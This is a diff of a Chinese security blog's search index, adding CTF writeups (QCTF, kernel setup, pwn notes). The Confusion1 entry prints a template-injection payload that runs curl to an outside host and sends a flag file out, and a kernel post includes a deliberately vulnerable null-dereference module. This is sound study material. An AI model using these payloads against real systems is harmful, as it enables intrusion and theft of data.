@@ -3,6 +3,151 @@
   
     
     <entry>
+      <title><![CDATA[好久不更blog]]></title>
+      <url>/2018/09/12/%E5%A5%BD%E4%B9%85%E4%B8%8D%E6%9B%B4blog/</url>
+      <content type="html"><![CDATA[<p>真的是好久不更blog…最近的生活有点迷</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[QCTF writeup]]></title>
+      <url>/2018/07/15/QCTF-writeup/</url>
+      <content type="html"><![CDATA[<p>第一天做了俩2re, 2pwn, 1web然后头疼就睡觉了<br>第二天起来比赛已经结束了..又看了俩Web…和一些逆向<br>虽然都是简单题…但我逆向太差了…做了挺久…而且逆完第二个就不想做了, 太弱了</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>union注入</p>
+<h3 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h3><p>弱类型, 购买的时候, 把数字都改成true, true和数字弱类型比较相等, 就会返回猜对了</p>
+<h3 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h3><p>有一些过滤, ‘sys’, 管道和反引号好像过滤了, 稍微改一下就OK</p>
+<pre><code>http://47.96.118.255:2333/{{config['O'+'SX'].__dict__['sy'+'stem']('curl http://1xx.1xx.xx.xx:7788/$(ca'+'t /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt)')}}
+</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="Xman-babyMips"><a href="#Xman-babyMips" class="headerlink" title="Xman-babyMips"></a>Xman-babyMips</h3><p>丢到jeb里看个大概, 每一位都是独立的, 就爆破一下</p>
+<h3 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h3><p>我就是对着代码硬着逆的…不知道大佬怎么逆的</p>
+<h3 id="baby-re"><a href="#baby-re" class="headerlink" title="baby-re"></a>baby-re</h3><p>现在看到baby就感觉…这可能是什么奇异的题目, 直觉告诉我…可能不是<code>C/C++</code><br>丢到IDA里看了一下….函数不是一般的多…<br>动态链接还这么多应该就是其他语言或者用了什么框架之类的吧<br>看了看字符串…感觉也许是<code>rust</code>, 我又没学过, 我也很无奈呀</p>
+<p>但随手敲一个答案, 连提示都没有…<br>扫到一个函数, 里面有32位, 猜flag是32位的, 试了一下<code>QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAA}</code>, 出了个wrong</p>
+<p>艰难的看了一下字符串, 正确应该是<code>correct</code>…但没看到, 然后gdb里search了一下, 看到了原来<code>correct</code>在另一个字符串后面跟着, 喵喵喵?</p>
+<p>有些函数没法<code>F5</code>, 报错..<code>call analysis failed</code>…这个时候往往是调用时参数分析不正确, 手动把那个函数参数更改一下, 就OK</p>
+<p>那Angr是不是能解决…</p>
+<p>这题还开了PIE, 我不会写, 放弃了, 等看flag</p>
+<h3 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h3><p>如何反混淆?<br><a href="https://bbs.pediy.com/thread-217727.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-217727.htm</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/112</a><br>这篇文章提到了一个工具..但我用不了, 会报错..</p>
+<p>而且程序中好像还用了这个库 <a href="https://zh.wikipedia.org/wiki/GNU%E5%A4%9A%E9%87%8D%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97%E5%BA%93" target="_blank" rel="external">https://zh.wikipedia.org/wiki/GNU%E5%A4%9A%E9%87%8D%E7%B2%BE%E5%BA%A6%E8%BF%90%E7%AE%97%E5%BA%93</a></p>
+<p>等WP + 1</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><p>栈溢出, 覆盖随机数种子为0, 然后自己生成50个结果就OK</p>
+<h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><p>覆盖返回地址到system, 加个参数’sh’<br>没有怎么调, 大概show了一下数字, 看到像是返回地址, 就覆盖试了一下, getshell<br>唯一的坑点在于不能直接用他的hack函数, 因为他环境里没有<code>bash</code>…</p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[ropemporium]]></title>
+      <url>/2018/07/12/ropemporium/</url>
+      <content type="html"><![CDATA[<p>参考wp: <a href="http://bestwing.me/2017/10/19/ropemporium-all-writeup/" target="_blank" rel="external">http://bestwing.me/2017/10/19/ropemporium-all-writeup/</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[kernel 环境搭建]]></title>
+      <url>/2018/07/12/kernel-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+      <content type="html"><![CDATA[<p>这个make bzImage用了我2G硬盘…<br>搞得我已经不敢随便make了</p>
+<p>其实在做MIT vx6的那实验的时候就搭过类似的环境了…</p>
+<p>这里基本是按照传说的v爷爷的blog做的<br><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" target="_blank" rel="external">https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</a></p>
+<p>就最后的脚本路径稍微改了一下</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+qemu-system-x86_64 \
+-m 64M \
+-kernel arch/x86_64/boot/bzImage \
+-initrd <span class="token punctuation">..</span>/busybox-1.28.4/rootfs.img \
+-append <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr"</span> \
+-netdev user,id<span class="token operator">=</span>t0, -device e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 \
+-nographic \
+-monitor /dev/null \
+-smp cores<span class="token operator">=</span>2,threads<span class="token operator">=</span>1 \
+-enable-kvm \
+-cpu kvm64,+smep \
+<span class="token comment" spellcheck="true"># -gdb tcp::1234 \</span>
+<span class="token comment" spellcheck="true"># -S</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我为什么编译了那么大的东西….QAQ</p>
+<p>最后看到一句…可以直接下载kernel</p>
+<pre class="line-numbers language-bash"><code class="language-bash">apt download linux-image-4.15.0-22-generic
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>所以….编译内核的意义在哪…<br>是可以对源码定制, 然后重新生成内核吗</p>
+<p>我遇到了新的问题…怎么关机</p>
+<p>好吧, 关不了机…只能直接<code>Ctrl+c</code></p>
+<h2 id="2-Demo"><a href="#2-Demo" class="headerlink" title="2 Demo"></a>2 Demo</h2><p>由于大家在做这demo的时候是用的<code>2.x</code>内核…而我照着大佬搭了一个<code>4.15</code>…(因为没有磁盘空间了,,,就不继续make了)<br>而这其中发生了…一个变迁就是<code>create_proc_entry</code>函数不能用了…就好像你用PHP7跑了SQLi-LAB…发现旧的数据库连接函数都废弃了的时候, 哈哈哈, 这里倒是没那么严重…换了新的函数, 稍作了修改</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// vim null_dereference.c </span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;linux/proc_fs.h></span></span>
+<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>my_funptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">static</span> ssize_t <span class="token function">bug1_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> file <span class="token operator">*</span>file<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span>size_t len<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>f_pos<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">my_funptr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> len<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">struct</span> file_operations proc_fops<span class="token operator">=</span>
+<span class="token punctuation">{</span>
+    <span class="token punctuation">.</span>write<span class="token operator">=</span>bug1_write
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">null_dereference_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"null_dereference driver init!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">proc_create</span><span class="token punctuation">(</span><span class="token string">"bug1"</span><span class="token punctuation">,</span><span class="token number">0666</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>proc_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">null_dereference_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_ALERT <span class="token string">"null_dereference driver exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">module_init</span><span class="token punctuation">(</span>null_dereference_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">module_exit</span><span class="token punctuation">(</span>null_dereference_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>另一个栈溢出的demo也是照着改, 而且栈溢出的demo需要关闭ALSR, 然后重新编译内核我就没做了</p>
+<h2 id="推荐的资料"><a href="#推荐的资料" class="headerlink" title="推荐的资料"></a>推荐的资料</h2><p>Linux device driver (LDD)<br>linux kernel development (LKD)</p>
+<p>Keegan McAllister的<code>Writing kernel exploits</code>…一份ppt, 就大家在传的两个demo</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[suctf2018 pwn]]></title>
+      <url>/2018/07/11/suctf2018-pwn/</url>
+      <content type="html"><![CDATA[<p>等整理完挖的坑<br>pwnable.tw 1~10<br>HITCON training<br>QWB</p>
+<p>就去跟着CTF-All-in-One, 做一下</p>
+]]></content>
+      
+        <categories>
+            
+            <category> writeup </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[区块链相关的CTF题目 | ddctf & *ctf]]></title>
       <url>/2018/07/10/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9B%B8%E5%85%B3%E7%9A%84CTF%E9%A2%98%E7%9B%AE-ddctf-ctf/</url>
       <content type="html"><![CDATA[<p>DDCTF颁奖的时候才知道这俩题都是同一个大佬出的…</p>
@@ -20,6 +165,8 @@
 <p>这个wp里还说道</p>
 <pre><code>This is a bit funny, because we&#39;ve seen in writeups of some other teams, that they got this part all wrong, and their solution worked purely by accident.
 </code></pre><p>woc…我也没发现…这个<code>server.js</code>的<code>switch</code>没有<code>break</code>…</p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>真是打扰了, 111支队做出来的安卓逆向我也不会做</p>
+<p>我还是复现之前的题目吧…也就Web能学习一下, 其他的wp都看不懂</p>
 ]]></content>
       
         <categories>
@@ -603,6 +750,9 @@ gdb<span class="token operator">-</span>peda$ x<span class="token operator">/</s
 <p>这个地方在我的环境里是距离<code>main_arena</code>距离为<code>0x7ffff7dd1b20 - 0x7ffff7dd1aed</code>, 所以<code>fake_chunk</code>地址是<code>main_arena - 0x33</code>, 这个<code>0x33</code>应该是出现在通过fake_chunk来更改<code>malloc_hook</code>的各种WP里…可以记住这值了<br>23333, 也有的人写<code>malloc_hook - 0x23</code>, 一样的</p>
 <p>而且由于伪造的<code>size</code>是0x7f, 所以…在计算大小的时候, <code>fastbin_index(0x7f)</code>, 是属于fastbinY[5], 对应chunk大小是<code>0x70</code>, data部分是<code>0x60</code>的…所以要选择分配对应大小的块, 才可以</p>
 <p>喔, That’ all.</p>
+<h3 id="关于跳转表"><a href="#关于跳转表" class="headerlink" title="关于跳转表"></a>关于跳转表</h3><p>IDA里出现了这个内容…虽然算一下就OK, 但看着很不直观</p>
+<pre class="line-numbers language-c"><code class="language-c">  <span class="token function">JUMPOUT</span><span class="token punctuation">(</span>__CS__<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dword_14F4 <span class="token operator">+</span> dword_14F4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 ]]></content>
       
         <categories>
@@ -1079,7 +1229,8 @@ constraints:
     <entry>
       <title><![CDATA[t3sec | pwn]]></title>
       <url>/2018/05/16/t3sec-pwn/</url>
-      <content type="html"><![CDATA[<h2 id="brain-stack"><a href="#brain-stack" class="headerlink" title="brain_stack"></a>brain_stack</h2><p>这题开了PIE, 第一反应是看怎么leak程序地址</p>
+      <content type="html"><![CDATA[<p>河南赛区的前两道题目</p>
+<h2 id="brain-stack"><a href="#brain-stack" class="headerlink" title="brain_stack"></a>brain_stack</h2><p>这题开了PIE, 第一反应是看怎么leak程序地址</p>
 <p>大概就是…初始时候 tape_ptr -&gt; tape<br>tape_ptr里存的是tape的地址.<br>这个tape里存的是随机的数字.</p>
 <p>我们有四个功能</p>
 <pre><code>&gt; tape_ptr++
@@ -1267,7 +1418,7 @@ remove<span class="token punctuation">(</span>payload2<span class="token punctua
 
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="xueba"><a href="#xueba" class="headerlink" title="xueba"></a>xueba</h2>]]></content>
+]]></content>
       
         <categories>
             
@@ -2575,8 +2726,22 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>因为unlink的时候是要<code>p -&gt; fd -&gt; bk = p -&gt; bk -&gt; fd</code>, 也就是要<code>(p -&gt; fd) + 0x18 = (p -&gt; bk + 0x10) = ptr</code>, 这个ptr里存着的是指向p的指针, 我们的<code>0x6020c0</code>, 是一个存着每个指针的数组, 我们的chunk_3是存在<code>(0x6020c0)[3] = (0x6020c0 + 3 * 0x8) = 0x6020d8</code>的位置…, 所以这里是<code>fake_fd = 0x6020d8 - 0x18</code>, <code>fake_bk = 0x6020d8 - 0x10</code></p>
 <p>因为fake的ptr需要, 所以要有chunk[0..2], 实际上1, 2没用上, 就是占位, 使得3因为4而被unlink的时候, 可以更改到chunk[0]的内容</p>
+<h2 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h2><p>遇到的第一个问题就是, 函数<code>sub_1160</code>没法f5, 倒是一行一行看汇编也能看懂…但感觉很不爽…<br>会报错<code>positive sp value has been found</code></p>
+<p>很久之前看到过解决办法, 实践一下<br>先勾一下这个, 显示栈指针</p>
+<pre><code>Options -&gt; Disassembly -&gt; Stack pointer
+</code></pre><p>然后在retn处的偏移不是0, 我在这题里看到的是<code>-04</code></p>
+<pre><code>.text:00000000000011F2 014                 leave
+.text:00000000000011F3 -04                 retn
+.text:00000000000011F3     sub_1160        endp ; sp-analysis failed
+</code></pre><p>在leave这里, <code>alt+k</code>, 在弹出来的菜单里把偏移量改成这里的<code>0x14</code>, (我这里原来是0x18)… 然后, 就会变成下图<br><code>retn</code>前的数字变成了<code>000</code>, 这个时候再<code>F5</code>就OK</p>
+<pre><code>.text:00000000000011F2 014                 leave
+.text:00000000000011F3 000                 retn
+.text:00000000000011F3     sub_1160        endp ; sp-analysis failed
+</code></pre><p>QAQ, 我也不知道为啥可以, 就是这样操作了一下…<br>然后看了一下…这函数好像啥都没干, 怎么<code>open</code>了<code>/dev/urandom</code>, 都没read, 就close了….一脸茫然</p>
+<p>对, 还有函数跳转表这里, 要把十六进制先变成十进制, 才能转换成负数</p>
+<p>接下来分析题目</p>
+<p>哎, 我擦, 算了, 先睡觉</p>
 <h2 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h2><p>todo </p>
-<h2 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h2><p>todo </p>
 <h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>todo </p>
 ]]></content>
       
@@ -15047,14 +15212,14 @@ creature<span class="token punctuation">.</span><span class="token function">sle
   
     
     <entry>
-      <title><![CDATA[tags]]></title>
-      <url>/tags/index.html</url>
+      <title><![CDATA[友链]]></title>
+      <url>/links/index.html</url>
       <content type="html"></content>
     </entry>
     
     <entry>
-      <title><![CDATA[友链]]></title>
-      <url>/links/index.html</url>
+      <title><![CDATA[tags]]></title>
+      <url>/tags/index.html</url>
       <content type="html"></content>
     </entry>
     
